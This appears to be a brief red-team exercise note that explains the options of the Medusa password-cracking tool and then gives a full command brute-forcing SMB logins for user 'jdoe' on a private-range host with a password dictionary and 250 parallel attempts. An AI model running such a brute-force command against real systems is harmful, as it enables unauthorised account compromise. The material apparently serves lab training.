-h - host to attack
-u - username
-P - password dictionary
-M - module
-n - port
-t - Total number of logins to be tested concurrently
-v - verbose level 4 (displays only the cracked password)

medusa -h 192.168.17.132 -u jdoe -P /home/kali/case-studies/Case-Studies-Red-Team/ExerciseControlPages/passwords.txt -M smbnt -n 445 -t 250 -v 4
